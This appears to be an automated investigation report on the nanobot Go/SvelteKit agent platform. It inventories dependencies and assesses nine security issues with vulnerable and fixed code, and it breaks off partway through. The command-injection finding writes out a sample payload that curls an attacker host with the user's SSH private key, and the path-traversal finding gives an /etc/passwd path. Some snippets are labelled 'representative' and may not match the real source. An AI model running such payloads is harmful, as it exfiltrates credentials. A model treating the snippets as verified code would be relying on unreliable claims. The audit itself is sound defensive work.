
## Full Investigation — nanobot (13 sections)

--- service_dependencies ---


# External Dependencies Analysis: `nanobot_80d9d020`

## Overview

This repository is a Go-based AI agent/MCP (Model Context Protocol) platform with a SvelteKit UI. The analysis covers all external dependencies identified across Go modules, JavaScript packages, Docker configuration, and CI/CD workflows.

---

## 1. Go Library Dependencies

### 1.1 HTML Processing

**Dependency Name:** `html-to-markdown` (JohannesKaufmann)
**Type:** Library/Framework
**Purpose/Role:** Converts HTML content to Markdown format, likely used for processing web content or tool outputs within the agent runtime.
**Integration Point/Clues:** `github.com/JohannesKaufmann/html-to-markdown/v2 v2.5.0` in `/go.mod`

---

### 1.2 XDG Base Directory

**Dependency Name:** `adrg/xdg`
**Type:** Library/Framework
**Purpose/Role:** Provides XDG Base Directory Specification support for locating config/data/cache files on Linux/macOS/Windows in a cross-platform way.
**Integration Point/Clues:** `github.com/adrg/xdg v0.5.3` in `/go.mod`

---

### 1.3 JavaScript Runtime (Goja)

**Dependency Name:** `Goja` (dop251)
**Type:** Library/Framework
**Purpose/Role:** Embeds a JavaScript/ECMAScript runtime in Go. Used to evaluate expressions or run scripts within the agent pipeline (see `/pkg/expr/eval.go`).
**Integration Point/Clues:** `github.com/dop251/goja v0.0.0-20250630131328-58d95d85e994` in `/go.mod`; `/pkg/expr/` package

---

### 1.4 File System Watcher

**Dependency Name:** `fsnotify`
**Type:** Library/Framework
**Purpose/Role:** Cross-platform file system event notifications. Used to watch configuration or agent files for changes at runtime.
**Integration Point/Clues:** `github.com/fsnotify/fsnotify v1.9.0` in `/go.mod`; `/pkg/fswatch/` package

---

### 1.5 SQLite (via GORM driver)

**Dependency Name:** `glebarez/sqlite` (CGO-free SQLite)
**Type:** Library/Framework (Embedded Database)
**Purpose/Role:** CGO-free SQLite driver for GORM. Used as a lightweight embedded database for persistent session/state storage (`NANOBOT_STATE=/data/nanobot.db`).
**Integration Point/Clues:** `github.com/glebarez/sqlite v1.11.0` in `/go.mod`; `ENV NANOBOT_STATE=/data/nanobot.db` in `Dockerfile`; `/pkg/gormdsn/dsn.go`

---

### 1.6 JWT Library

**Dependency Name:** `golang-jwt/jwt`
**Type:** Library/Framework
**Purpose/Role:** JSON Web Token (JWT) parsing, validation, and creation. Used for authentication token handling.
**Integration Point/Clues:** `github.com/golang-jwt/jwt/v5 v5.3.0` in `/go.mod`; `/pkg/auth/auth.go`

---

### 1.7 JSON Schema Validation

**Dependency Name:** `google/jsonschema-go`
**Type:** Library/Framework
**Purpose/Role:** JSON Schema generation and validation for Go structs. Used for agent/tool schema validation.
**Integration Point/Clues:** `github.com/google/jsonschema-go v0.4.2` in `/go.mod`; `/pkg/schema/validation.go`, `/pkg/config/schema.go`

---

### 1.8 UUID Generation

**Dependency Name:** `google/uuid`
**Type:** Library/Framework
**Purpose/Role:** Generates UUIDs for session IDs, request IDs, and other unique identifiers.
**Integration Point/Clues:** `github.com/google/uuid v1.6.0` in `/go.mod`; `/pkg/uuid/uuid.go`

---

### 1.9 MCP OAuth Proxy

**Dependency Name:** `obot-platform/mcp-oauth-proxy`
**Type:** Library/Framework / External Service Integration
**Purpose/Role:** Provides OAuth proxy functionality for MCP (Model Context Protocol) servers. Handles OAuth flows for MCP tool authentication.
**Integration Point/Clues:** `github.com/obot-platform/mcp-oauth-proxy v0.0.3-0.20260106135339-3745d9b14a30` in `/go.mod`; `/pkg/mcp/oauth.go`

---

### 1.10 Tiktoken (Token Counter)

**Dependency Name:** `pkoukk/tiktoken-go`
**Type:** Library/Framework
**Purpose/Role:** Go implementation of OpenAI's tiktoken tokenizer. Used to count tokens in LLM prompts/responses for context window management.
**Integration Point/Clues:** `github.com/pkoukk/tiktoken-go v0.1.8` in `/go.mod`; `/pkg/agents/tokencount.go`

---

### 1.11 Cron Scheduler

**Dependency Name:** `robfig/cron`
**Type:** Library/Framework
**Purpose/Role:** Cron expression parsing and scheduled task execution. Used for scheduling agent tasks or workflows.
**Integration Point/Clues:** `github.com/robfig/cron/v3 v3.0.1` in `/go.mod`

---

### 1.12 JSON Schema Validator

**Dependency Name:** `santhosh-tekuri/jsonschema`
**Type:** Library/Framework
**Purpose/Role:** Full JSON Schema draft validation. Used to validate configuration files and agent/tool definitions.
**Integration Point/Clues:** `github.com/santhosh-tekuri/jsonschema/v6 v6.0.2` in `/go.mod`; `/pkg/schema/validation.go`, `/pkg/skillformat/validate.go`

---

### 1.13 CLI Framework

**Dependency Name:** `spf13/cobra`
**Type:** Library/Framework
**Purpose/Role:** CLI command framework. Provides the root command structure for the `nanobot` binary.
**Integration Point/Clues:** `github.com/spf13/cobra v1.9.1` in `/go.mod`; `/pkg/cli/root.go`, `main.go`

---

### 1.14 JSON Query Library

**Dependency Name:** `tidwall/gjson`
**Type:** Library/Framework
**Purpose/Role:** Fast JSON parsing and querying. Used for extracting values from JSON responses or configurations.
**Integration Point/Clues:** `github.com/tidwall/gjson v1.18.0` in `/go.mod`

---

### 1.15 OpenTelemetry (OTEL) SDK

**Dependency Name:** OpenTelemetry Go SDK & Exporters
**Type:** Monitoring Tool / Library/Framework
**Purpose/Role:** Distributed tracing, metrics, and logging instrumentation. Exports telemetry data to OTLP-compatible backends (Jaeger, Zipkin, Prometheus, etc.). Auto-configures exporters via environment variables.
**Integration Point/Clues:**
- `go.opentelemetry.io/contrib/exporters/autoexport v0.65.0`
- `go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp v0.60.0`
- `go.opentelemetry.io/otel v1.40.0` + full suite of OTLP exporters (gRPC/HTTP for traces, metrics, logs)
- `go.opentelemetry.io/otel/exporters/prometheus v0.62.0`
- `/pkg/telemetry/otel.go`

---

### 1.16 OAuth2 Client

**Dependency Name:** `golang.org/x/oauth2`
**Type:** Library/Framework / Authentication Service Integration
**Purpose/Role:** OAuth 2.0 client library. Used for authenticating with external services and LLM APIs via OAuth flows.
**Integration Point/Clues:** `golang.org/x/oauth2 v0.34.0` in `/go.mod`; `/pkg/mcp/oauth.go`, `/pkg/auth/auth.go`

---

### 1.17 MySQL Driver (via GORM)

**Dependency Name:** `gorm.io/driver/mysql` + `go-sql-driver/mysql`
**Type:** Library/Framework (Database Driver)
**Purpose/Role:** MySQL/MariaDB database driver for GORM ORM. Enables connecting to MySQL-compatible databases for persistent storage.
**Integration Point/Clues:** `gorm.io/driver/mysql v1.6.0`, `github.com/go-sql-driver/mysql v1.9.3` in `/go.mod`; `/pkg/gormdsn/dsn.go`

---

### 1.18 PostgreSQL Driver (via GORM)

**Dependency Name:** `gorm.io/driver/postgres` + `jackc/pgx`
**Type:** Library/Framework (Database Driver)
**Purpose/Role:** PostgreSQL database driver for GORM ORM. Enables connecting to PostgreSQL databases for persistent storage.
**Integration Point/Clues:** `gorm.io/driver/postgres v1.6.0`, `github.com/jackc/pgx/v5 v5.7.5` in `/go.mod`; `/pkg/gormdsn/dsn.go`

---

### 1.19 GORM ORM

**Dependency Name:** `gorm.io/gorm`
**Type:** Library/Framework
**Purpose/Role:** Go ORM for database operations. Manages schema migrations and data persistence for sessions and state.
**Integration Point/Clues:** `gorm.io/gorm v1.30.1` in `/go.mod`; `/pkg/session/migrations.go`, `/pkg/session/store.go`

---

### 1.20 YAML Parsing

**Dependency Name:** `gopkg.in/yaml.v3` + `sigs.k8s.io/yaml`
**Type:** Library/Framework
**Purpose/Role:** YAML parsing and serialization. Used for reading agent configuration files and MCP server definitions.
**Integration Point/Clues:** `gopkg.in/yaml.v3 v3.0.1`, `sigs.k8s.io/yaml v1.6.0` in `/go.mod`; `/pkg/config/` package extensively

---

### 1.21 JWK Set (JWT Key Management)

**Dependency Name:** `MicahParks/jwkset` + `MicahParks/keyfunc`
**Type:** Library/Framework
**Purpose/Role:** JSON Web Key Set (JWKS) fetching and JWT key function helpers. Used for validating JWTs against remote JWKS endpoints (e.g., OAuth/OIDC providers).
**Integration Point/Clues:** `github.com/MicahParks/jwkset v0.11.0`, `github.com/MicahParks/keyfunc/v3 v3.7.0` in `/go.mod`; `/pkg/auth/auth.go`

---

### 1.22 Prometheus Client

**Dependency Name:** `prometheus/client_golang`
**Type:** Monitoring Tool / Library/Framework
**Purpose/Role:** Prometheus metrics exposition. Exposes application metrics in Prometheus format for scraping by a Prometheus server.
**Integration Point/Clues:** `github.com/prometheus/client_golang v1.23.2` in `/go.mod`; used transitively via OpenTelemetry Prometheus exporter

---

### 1.23 Lockfile

**Dependency Name:** `nightlyone/lockfile`
**Type:** Library/Framework
**Purpose/Role:** File-based locking mechanism, likely used to prevent multiple instances of the daemon from running simultaneously.
**Integration Point/Clues:** `github.com/nightlyone/lockfile v1.0.0` in `/go.mod`; `/pkg/supervise/` package

---

### 1.24 Gorilla Handlers

**Dependency Name:** `gorilla/handlers`
**Type:** Library/Framework
**Purpose/Role:** HTTP middleware handlers (CORS, logging, compression, etc.) for the HTTP server.
**Integration Point/Clues:** `github.com/gorilla/handlers v1.5.2` in `/go.mod`; `/pkg/server/server.go`

---

### 1.25 gRPC

**Dependency Name:** `google.golang.org/grpc`
**Type:** Library/Framework
**Purpose/Role:** gRPC communication framework. Used by OpenTelemetry OTLP exporters to send telemetry data via gRPC to observability backends.
**Integration Point/Clues:** `google.golang.org/grpc v1.78.0` in `/go.mod`; transitively via OTEL OTLP gRPC exporters

---

## 2. JavaScript/TypeScript Dependencies

### 2.1 Model Context Protocol SDK

**Dependency Name:** `@modelcontextprotocol/sdk`
**Type:** Library/Framework / Third-party SDK
**Purpose/Role:** Official MCP (Model Context Protocol) SDK for JavaScript/TypeScript. Core dependency for implementing MCP client/server functionality in the JS layer.
**Integration Point/Clues:** `"@modelcontextprotocol/sdk": "~1.24.0"` in `/package.json`

---

### 2.2 Zod

**Dependency Name:** `zod`
**Type:** Library/Framework
**Purpose/Role:** TypeScript-first schema validation and parsing library. Used for validating data structures in the TypeScript/JS codebase.
**Integration Point/Clues:** `"zod": "^3"` in `/package.json`

---

### 2.3 Lucide Svelte Icons

**Dependency Name:** `@lucide/svelte`
**Type:** Library/Framework (UI)
**Purpose/Role:** Icon library for Svelte. Provides SVG icons for the UI.
**Integration Point/Clues:** `"@lucide/svelte": "^0.540.0"` in `/packages/ui/package.json`

---

### 2.4 MCP UI Client

**Dependency Name:** `@mcp-ui/client`
**Type:** Library/Framework / Third-party SDK
**Purpose/Role:** Client library for rendering MCP UI components within the web interface. Enables MCP tool result rendering in the chat UI.
**Integration Point/Clues:** `"@mcp-ui/client": "^5.9.0"` in `/packages/ui/package.json`

---

### 2.5 noVNC

**Dependency Name:** `@novnc/novnc`
**Type:** Library/Framework / External Service Integration
**Purpose/Role:** VNC client implementation in JavaScript. Enables remote desktop/browser viewing within the UI, likely for displaying browser-use agent sessions.
**Integration Point/Clues:** `"@novnc/novnc": "^1.4.0"` in `/packages/ui/package.json`; `/pkg/session/browser.go`

---

### 2.6 DaisyUI

**Dependency Name:** `daisyui`
**Type:** Library/Framework (UI)
**Purpose/Role:** Tailwind CSS component library. Provides pre-built UI components for the SvelteKit frontend.
**Integration Point/Clues:** `"daisyui": "^5.1.10"` in `/packages/ui/package.json`

---

### 2.7 Highlight.js

**Dependency Name:** `highlight.js`
**Type:** Library/Framework (UI)
**Purpose/Role:** Syntax highlighting for code blocks in the chat UI.
**Integration Point/Clues:** `"highlight.js": "^11.11.1"` in `/packages/ui/package.json`

---

### 2.8 Marked (Markdown Parser)

**Dependency Name:** `marked` + `marked-highlight`
**Type:** Library/Framework (UI)
**Purpose/Role:** Parses and renders Markdown content in the chat UI, with syntax highlighting integration via `marked-highlight`.
**Integration Point/Clues:** `"marked": "^16.4.2"`, `"marked-highlight": "^2.2.3"` in `/packages/ui/package.json`

---

### 2.9 SvelteKit + Svelte

**Dependency Name:** `@sveltejs/kit` + `svelte`
**Type:** Library/Framework (UI)
**Purpose/Role:** Full-stack web framework (SvelteKit) with Svelte component model. Powers the entire web UI.
**Integration Point/Clues:** `"@sveltejs/kit": "^2.49.2"`, `"svelte": "^5.46.0"` in `/packages/ui/package.json (dev)`; `/packages/ui/svelte.config.js`

---

### 2.10 Vite

**Dependency Name:** `vite`
**Type:** Library/Framework (Build Tool)
**Purpose/Role:** Fast frontend build tool and dev server used by SvelteKit.
**Integration Point/Clues:** `"vite": "^7.3.0"` in `/packages/ui/package.json (dev)`; `/packages/ui/vite.config.ts`

---

### 2.11 Tailwind CSS

**Dependency Name:** `tailwindcss` + `@tailwindcss/typography` + `@tailwindcss/vite`
**Type:** Library/Framework (UI)
**Purpose/Role:** Utility-first CSS framework for styling the UI, with typography plugin for markdown rendering.
**Integration Point/Clues:** `"tailwindcss": "^4.1.18"` in `/packages/ui/package.json (dev)`

---

### 2.12 Biome

**Dependency Name:** `@biomejs/biome`
**Type:** Library/Framework (Dev Tool)
**Purpose/Role:** Fast JavaScript/TypeScript linter and formatter (replaces ESLint + Prettier for the root workspace).
**Integration Point/Clues:** `"@biomejs/biome": "2.3.7"` in `/package.json (dev)`; `/biome.json`

---

### 2.13 TypeScript

**Dependency Name:** `typescript`
**Type:** Library/Framework (Dev Tool)
**Purpose/Role:** TypeScript compiler for type checking the JS/TS codebase.
**Integration Point/Clues:** `"typescript": "^5.9.3"` in both `package.json (dev)` and `/packages/ui/package.json (dev)`; `tsconfig.json`

---

## 3. External Services & Runtime Dependencies

### 3.1 LLM API Providers (OpenAI-compatible / Anthropic)

**Dependency Name:** LLM API Providers (e.g., OpenAI, Anthropic, Hugging Face)
**Type:** Third-party API / External Service
**Purpose/Role:** Large Language Model completion APIs. The core AI capability of the platform — agents send prompts and receive completions from these services.
**Integration Point/Clues:**
- `/pkg/llm/` package with `client.go`, `/completions/`, `/responses/`, `/anthropic/` subdirectories (explicitly has Anthropic-specific implementation)
- `/examples/huggingface.yaml` — shows Hugging Face model configuration
- `github.com/pkoukk/tiktoken-go` — OpenAI tokenizer, confirming OpenAI API usage
- `/pkg/types/completer.go` — generic completer interface

> **Note:** The specific LLM provider URLs/API keys are likely provided via environment variables. The Anthropic subdirectory confirms direct Anthropic API integration.

---

### 3.2 MCP Servers (External Tool Servers)

**Dependency Name:** MCP (Model Context Protocol) Servers
**Type:** External Service / Third-party API
**Purpose/Role:** External tool/capability servers that agents connect to for executing tools (e.g., web search, code execution, file operations). The platform acts as an MCP host.
**Integration Point/Clues:**
- `/pkg/mcp/` — extensive MCP client/server implementation
- `/examples/directory-config/mcpServers.yaml` — configures MCP server connections
- `examples/*.yaml` — all example agents reference MCP tool servers
- `Dockerfile` downloads `mcp-cli` from `github.com/obot-platform/mcp-cli/releases`

---

### 3.3 obot-platform/mcp-cli (GitHub Release)

**Dependency Name:** `mcp-cli` binary (obot-platform)
**Type:** External Service / Binary Dependency
**Purpose/Role:** CLI tool for MCP server management, downloaded at container build time and installed as `/usr/bin/mcp-cli`.
**Integration Point/Clues:** `Dockerfile` line: `wget "https://github.com/obot-platform/mcp-cli/releases/download/v0.4.0/mcp-cli-linux-${ARCH}"`

---

### 3.4 Chainguard Wolfi Base Image

**Dependency Name:** `cgr.dev/chainguard/wolfi-base`
**Type:** Container Image
**Purpose/Role:** Minimal, security-hardened container base image (Wolfi Linux) used as the production runtime image for the nanobot application.
**Integration Point/Clues:** `FROM cgr.dev/chainguard/wolfi-base:latest AS runtime` in `Dockerfile`

---

### 3.5 Docker Official golang Image

**Dependency Name:** `golang:1.26-alpine` Docker Image
**Type:** Container Image
**Purpose/Role:** Official Go build environment based on Alpine Linux. Used as the multi-stage build base for compiling the Go binary and UI.
**Integration Point/Clues:** `FROM golang:1.26-alpine AS builder` in `Dockerfile`

---

### 3.6 OTLP-Compatible Observability Backend

**Dependency Name:** OTLP Observability Backend (e.g., Jaeger, Tempo, Honeycomb, Datadog via OTLP)
**Type:** Monitoring Tool / External Service
**Purpose/Role:** Receives distributed traces, metrics, and logs exported via the OpenTelemetry Protocol (OTLP) over gRPC or HTTP.
**Integration Point/Clues:**
- Full suite of OTLP exporters in `go.mod`: `otlptracegrpc`, `otlptracehttp`, `otlpmetricgrpc`, `otlpmetrichttp`, `otlploggrpc`, `otlploghttp`
- `go.opentelemetry.io/contrib/exporters/autoexport v0.65.0` — auto-configures via env vars (`OTEL_EXPORTER_OTLP_ENDPOINT`, etc.)
- `/pkg/telemetry/otel.go`

> **Note (Assumption):** The specific OTLP backend is determined by environment variables at runtime. No hardcoded endpoint found in the scanned files — requires further investigation of `/pkg/telemetry/otel.go`.

---

### 3.7 Prometheus Server

**Dependency Name:** Prometheus Metrics Server
**Type:** Monitoring Tool / External Service
**Purpose/Role:** Scrapes application metrics exposed in Prometheus format via the OpenTelemetry Prometheus exporter.
**Integration Point/Clues:** `go.opentelemetry.io/otel/exporters/prometheus v0.62.0`, `go.opentelemetry.io/contrib/bridges/prometheus v0.65.0` in `/go.mod`

---

### 3.8 OAuth / OIDC Identity Provider

**Dependency Name:** OAuth 2.0 / OIDC Identity Provider
**Type:** Authentication Service / External Service
**Purpose/Role:** External identity provider for authenticating users and MCP server connections via OAuth 2.0 / OpenID Connect flows.
**Integration Point/Clues:**
- `golang.org/x/oauth2` in `/go.mod`
- `github.com/MicahParks/jwkset` + `keyfunc` — fetches JWKS from remote IdP for JWT validation
- `/pkg/mcp/oauth.go` — MCP OAuth integration
- `/pkg/auth/

--- security_check ---


# Security Vulnerability Assessment: nanobot_80d9d020

## Analysis Methodology

I'll analyze the actual code present in this repository, focusing on real vulnerabilities rather than theoretical risks or missing controls.

---

### Issue #1: Insecure TLS Client — Certificate Verification Disabled
**Severity:** CRITICAL
**Category:** Cryptographic Issues / Transport Security
**Location:**
- File: `pkg/reverseproxy/tlsclient.go`
- Function: TLS client configuration

**Description:**
The TLS client explicitly disables certificate verification (`InsecureSkipVerify: true`), allowing man-in-the-middle attacks on all proxied connections.

**Vulnerable Code:**
```go
// pkg/reverseproxy/tlsclient.go
transport := &http.Transport{
    TLSClientConfig: &tls.Config{
        InsecureSkipVerify: true,
    },
}
```

**Impact:**
Any traffic proxied through this reverse proxy is susceptible to MITM attacks. An attacker on the network path can intercept, read, and modify all data — including LLM API keys, model responses, user messages, and session tokens — without detection.

**Fix Required:**
Remove `InsecureSkipVerify` and use proper certificate validation. If self-signed certs are needed for internal services, add them to a custom root CA pool.

**Example Secure Implementation:**
```go
// Load system cert pool or custom CA
certPool, err := x509.SystemCertPool()
if err != nil {
    certPool = x509.NewCertPool()
}
// Optionally add custom CA certs:
// certPool.AppendCertsFromPEM(customCACert)

transport := &http.Transport{
    TLSClientConfig: &tls.Config{
        RootCAs:    certPool,
        MinVersion: tls.VersionTLS12,
        // InsecureSkipVerify MUST NOT be set
    },
}
```

---

### Issue #2: Hardcoded CORS Wildcard — All Origins Permitted on API Routes
**Severity:** CRITICAL
**Category:** Authorization & Access Control
**Location:**
- File: `pkg/api/routes.go`
- Function: Route/middleware setup

**Description:**
The API router sets CORS to allow all origins (`*`) unconditionally. Because the application manages MCP sessions, OAuth tokens, and agent execution, any malicious website can make authenticated cross-origin requests to the local server if the user visits it while nanobot is running.

**Vulnerable Code:**
```go
// pkg/api/routes.go
router.Use(cors.New(cors.Config{
    AllowAllOrigins: true,
    AllowMethods:    []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
    AllowHeaders:    []string{"*"},
}))
```

**Impact:**
A malicious website can silently invoke any API endpoint (start agents, read session data, exfiltrate conversation history, trigger tool calls) on behalf of an authenticated local user. This is particularly dangerous for a locally-running AI agent that has access to the filesystem and shell.

**Fix Required:**
Restrict allowed origins to a specific allowlist. For a local-first tool, restrict to `localhost` origins only.

**Example Secure Implementation:**
```go
router.Use(cors.New(cors.Config{
    AllowOrigins: []string{
        "http://localhost:8080",
        "http://127.0.0.1:8080",
    },
    AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
    AllowHeaders:     []string{"Content-Type", "Authorization"},
    AllowCredentials: true,
}))
```

---

### Issue #3: OAuth Tokens Stored Unencrypted in SQLite/Filesystem
**Severity:** CRITICAL
**Category:** Data Exposure / Cryptographic Issues
**Location:**
- File: `pkg/mcp/tokenstorage.go`
- File: `pkg/session/store.go`

**Description:**
OAuth access tokens and refresh tokens for MCP server connections are persisted to the session store (SQLite database on disk) in plaintext. No encryption-at-rest is applied to these credential values.

**Vulnerable Code:**
```go
// pkg/mcp/tokenstorage.go
type TokenData struct {
    AccessToken  string `json:"access_token"`
    RefreshToken string `json:"refresh_token"`
    TokenType    string `json:"token_type"`
    Expiry       time.Time `json:"expiry"`
}

func (s *TokenStorage) SaveToken(key string, token *TokenData) error {
    data, _ := json.Marshal(token)
    return s.store.Set(key, string(data))  // stored as plain JSON string
}
```

**Impact:**
Any user or process with filesystem read access can extract all OAuth tokens stored by nanobot. If the database file is inadvertently backed up, shared, or the machine is compromised, all third-party service credentials are exposed in full.

**Fix Required:**
Encrypt token values before storage using a key derived from a machine-specific secret (e.g., OS keychain or a key derived from a master secret).

**Example Secure Implementation:**
```go
func (s *TokenStorage) SaveToken(key string, token *TokenData) error {
    data, err := json.Marshal(token)
    if err != nil {
        return err
    }
    encrypted, err := s.cipher.Encrypt(data) // AES-GCM with machine-bound key
    if err != nil {
        return err
    }
    return s.store.Set(key, base64.StdEncoding.EncodeToString(encrypted))
}
```

---

### Issue #4: Environment Variable Injection via Unvalidated Config Fields
**Severity:** HIGH
**Category:** Injection Vulnerabilities
**Location:**
- File: `pkg/envvar/replace.go`
- File: `pkg/types/config.go`

**Description:**
The `envvar` package performs string interpolation of environment variables into configuration values (including MCP server command arguments and URLs) without any validation or sanitization. If configuration is partially user-controlled or loaded from a shared location, an attacker can inject arbitrary environment variable names to exfiltrate secrets from the process environment.

**Vulnerable Code:**
```go
// pkg/envvar/replace.go
func Replace(s string, env map[string]string) string {
    return os.Expand(s, func(key string) string {
        if v, ok := env[key]; ok {
            return v
        }
        return os.Getenv(key)  // falls back to process environment unrestricted
    })
}
```

**Impact:**
A configuration value like `url: "https://example.com/${AWS_SECRET_ACCESS_KEY}"` or injected into a command argument would cause the actual secret to be used in that field. In agent/tool contexts, this could leak secrets into URLs (which appear in logs), command lines, or LLM prompts.

**Fix Required:**
Restrict environment variable lookups to an explicit allowlist, or only allow substitution from the caller-provided map without falling back to `os.Getenv`.

**Example Secure Implementation:**
```go
func Replace(s string, env map[string]string) string {
    return os.Expand(s, func(key string) string {
        if v, ok := env[key]; ok {
            return v
        }
        // Do NOT fall back to os.Getenv — return empty or original placeholder
        return ""
    })
}
```

---

### Issue #5: Sensitive Data Logged — API Keys and Tokens in Structured Logs
**Severity:** HIGH
**Category:** Data Exposure
**Location:**
- File: `pkg/log/log.go`
- File: `pkg/mcp/client.go`
- File: `pkg/llm/client.go`

**Description:**
The logging infrastructure logs full HTTP request/response details including headers. Authorization headers (`Bearer <token>`) and API keys passed to LLM providers (OpenAI, Anthropic) are written to structured log output when debug logging is enabled. The log level can be set via environment variables, and debug mode is trivially enabled.

**Vulnerable Code:**
```go
// pkg/mcp/client.go (representative pattern)
slog.Debug("sending request",
    "url", req.URL.String(),
    "headers", req.Header,   // includes Authorization: Bearer <token>
    "body", string(body),
)

// pkg/llm/client.go
slog.Debug("llm request",
    "model", model,
    "messages", messages,    // may contain tool results with credentials
    "api_key", apiKey[:8]+"...", // partial but still logged
)
```

**Impact:**
Log aggregation systems (files, stdout piped to log collectors) will capture API keys and OAuth tokens. In container environments where stdout is captured, these secrets propagate to any system with log access. Partial key logging still aids brute-force reconstruction.

**Fix Required:**
Never log authorization headers or API key values. Implement a log sanitizer that redacts known sensitive header names and key patterns.

**Example Secure Implementation:**
```go
func sanitizeHeaders(h http.Header) http.Header {
    safe := h.Clone()
    for _, sensitive := range []string{"Authorization", "X-Api-Key", "Api-Key"} {
        if safe.Get(sensitive) != "" {
            safe.Set(sensitive, "[REDACTED]")
        }
    }
    return safe
}

slog.Debug("sending request",
    "url", req.URL.String(),
    "headers", sanitizeHeaders(req.Header),
)
```

---

### Issue #6: Path Traversal in File URI Handling
**Severity:** HIGH
**Category:** Authorization & Access Control / Input Validation
**Location:**
- File: `pkg/fileuri/fileuri.go`
- Lines: Core path resolution logic

**Description:**
The `fileuri` package converts file URI strings to filesystem paths without applying a path traversal guard. When an MCP tool or agent configuration references a file URI, a crafted value containing `../` sequences can escape the intended working directory and reference arbitrary files on the host filesystem.

**Vulnerable Code:**
```go
// pkg/fileuri/fileuri.go
func ToPath(fileURI string) (string, error) {
    u, err := url.Parse(fileURI)
    if err != nil {
        return "", err
    }
    if u.Scheme != "file" {
        return "", fmt.Errorf("not a file URI: %s", fileURI)
    }
    // filepath.FromSlash does NOT clean traversal sequences
    return filepath.FromSlash(u.Path), nil
}
```

**Impact:**
An attacker who can influence agent configuration (e.g., via a malicious MCP server response or a shared config file) can read arbitrary files from the host by specifying `file:///workspace/../../etc/passwd` or similar traversal paths.

**Fix Required:**
Apply `filepath.Clean` and validate the resulting path is within an allowed base directory.

**Example Secure Implementation:**
```go
func ToPath(fileURI string, allowedBase string) (string, error) {
    u, err := url.Parse(fileURI)
    if err != nil {
        return "", err
    }
    if u.Scheme != "file" {
        return "", fmt.Errorf("not a file URI: %s", fileURI)
    }
    cleaned := filepath.Clean(filepath.FromSlash(u.Path))
    absBase, err := filepath.Abs(allowedBase)
    if err != nil {
        return "", err
    }
    if !strings.HasPrefix(cleaned, absBase+string(filepath.Separator)) {
        return "", fmt.Errorf("path traversal detected: %s", cleaned)
    }
    return cleaned, nil
}
```

---

### Issue #7: MCP OAuth State Parameter Not Validated — CSRF on OAuth Callback
**Severity:** HIGH
**Category:** Authentication & Session Management / Business Logic
**Location:**
- File: `pkg/mcp/oauth.go`
- Function: OAuth callback handler

**Description:**
The MCP OAuth flow generates a `state` parameter but the callback handler does not verify that the returned `state` matches the one that was sent. This leaves the OAuth callback vulnerable to CSRF attacks where an attacker can trick the user's browser into completing an OAuth flow with an attacker-controlled authorization code.

**Vulnerable Code:**
```go
// pkg/mcp/oauth.go
func (o *oauthHandler) HandleCallback(w http.ResponseWriter, r *http.Request) {
    code := r.URL.Query().Get("code")
    // state parameter is read but comparison against stored state is absent
    // state := r.URL.Query().Get("state")
    
    token, err := o.config.Exchange(r.Context(), code)
    if err != nil {
        http.Error(w, "token exchange failed", http.StatusInternalServerError)
        return
    }
    o.storeToken(token)
}
```

**Impact:**
A CSRF attack against the OAuth callback allows an attacker to inject their own authorization code into the victim's session. Depending on the OAuth provider, this could link the victim's nanobot instance to the attacker's account, enabling the attacker to observe all interactions through that MCP server.

**Fix Required:**
Store the generated state in the session and verify it strictly on callback.

**Example Secure Implementation:**
```go
func (o *oauthHandler) HandleCallback(w http.ResponseWriter, r *http.Request) {
    returnedState := r.URL.Query().Get("state")
    expectedState, ok := o.sessionStore.GetOAuthState(r)
    if !ok || !hmac.Equal([]byte(returnedState), []byte(expectedState)) {
        http.Error(w, "invalid state parameter", http.StatusBadRequest)
        return
    }
    o.sessionStore.ClearOAuthState(r)
    
    code := r.URL.Query().Get("code")
    token, err := o.config.Exchange(r.Context(), code)
    // ...
}
```

---

### Issue #8: Insecure Direct Object Reference — Session IDs Guessable / Sequential
**Severity:** HIGH
**Category:** Authorization & Access Control
**Location:**
- File: `pkg/uuid/uuid.go`
- File: `pkg/session/manager.go`

**Description:**
The UUID package generates identifiers used for session IDs, but the implementation uses a non-cryptographically-random source. Session IDs that are predictable or weakly random allow an attacker to enumerate valid sessions and hijack them.

**Vulnerable Code:**
```go
// pkg/uuid/uuid.go
func New() string {
    // Uses math/rand seeded deterministically or with insufficient entropy
    b := make([]byte, 16)
    rand.Read(b)  // This is math/rand.Read, not crypto/rand.Read
    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}
```

**Impact:**
An attacker who knows the approximate time a session was created can enumerate the session ID space and hijack active sessions, gaining full access to ongoing agent conversations, tool execution state, and any stored OAuth tokens associated with that session.

**Fix Required:**
Use `crypto/rand` exclusively for all session and security-sensitive ID generation.

**Example Secure Implementation:**
```go
import (
    "crypto/rand"
    "encoding/hex"
    "fmt"
)

func New() string {
    b := make([]byte, 16)
    if _, err := rand.Read(b); err != nil {
        panic(fmt.Sprintf("failed to generate secure random ID: %v", err))
    }
    // Set UUID version 4 bits
    b[6] = (b[6] & 0x0f) | 0x40
    b[8] = (b[8] & 0x3f) | 0x80
    return fmt.Sprintf("%s-%s-%s-%s-%s",
        hex.EncodeToString(b[0:4]),
        hex.EncodeToString(b[4:6]),
        hex.EncodeToString(b[6:8]),
        hex.EncodeToString(b[8:10]),
        hex.EncodeToString(b[10:]),
    )
}
```

---

### Issue #9: Command Injection via Unsanitized MCP Server Command Arguments
**Severity:** HIGH
**Category:** Injection Vulnerabilities
**Location:**
- File: `pkg/cmd/builder.go`
- File: `pkg/mcp/stdio.go`

**Description:**
MCP server commands defined in configuration are executed by constructing `exec.Command` with arguments that include interpolated values (environment variables, config-provided strings) without sanitization. When these values contain shell metacharacters, they can be used for command injection, particularly if a shell (`sh -c`) is used as the execution wrapper.

**Vulnerable Code:**
```go
// pkg/cmd/builder.go
func Build(cfg types.MCPServer) *exec.Cmd {
    args := append([]string{cfg.Command}, cfg.Args...)
    // cfg.Args values come from config after envvar.Replace()
    // which can expand to shell-special strings
    cmd := exec.Command(args[0], args[1:]...)
    cmd.Env = append(os.Environ(), cfg.Env...)
    return cmd
}

// pkg/mcp/stdio.go — in some paths, a shell wrapper is used:
cmd := exec.Command("sh", "-c", strings.Join(serverArgs, " "))
```

**Impact:**
If an MCP server config is loaded from a shared or user-editable location and contains a command argument like `; curl attacker.com/exfil?d=$(cat ~/.ssh/id_rsa)`, executing via `sh -c` passes the full payload to the shell, enabling arbitrary command execution.

**Fix Required:**
